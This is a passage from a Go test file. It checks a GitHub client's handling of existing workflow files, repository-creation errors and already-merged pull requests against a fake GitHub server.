	}
	put := f.bodies["PUT /repos/acme/my-app-1234abcd/contents/.github/workflows/deploy.yml"]
	if put["sha"] != "abc123" {
		t.Fatalf("existing file was not re-put with its sha: %#v", put)
	}
}

func TestGitHub_CreateRepo_OtherCreateErrorStillFails(t *testing.T) {
	f := newFakeGitHub(t)
	f.createRepo422 = "Repository creation failed: quota exceeded"
	g := newGH(t, f, "")
	if _, err := g.CreateRepo(context.Background(), ghCreds, testutil.GCPCreds, "id-1", "x"); err == nil {
		t.Fatal("a 422 other than name-exists must still fail")
	}
}

func TestGitHub_MergePR_AlreadyMergedIsSuccess(t *testing.T) {
	const repo, pr = "https://github.com/acme/repo", "https://github.com/acme/repo/pull/7"
	f := newFakeGitHub(t)
	f.mergeStatus, f.prMerged = 405, true
	if err := newGH(t, f, "").MergePR(context.Background(), ghCreds, repo, pr); err != nil {
		t.Fatalf("already merged must be success: %v", err)
	}

	f2 := newFakeGitHub(t)
	f2.mergeStatus = 405
	if err := newGH(t, f2, "").MergePR(context.Background(), ghCreds, repo, pr); err == nil {
		t.Fatal("not mergeable and not merged must still fail")
	}
}
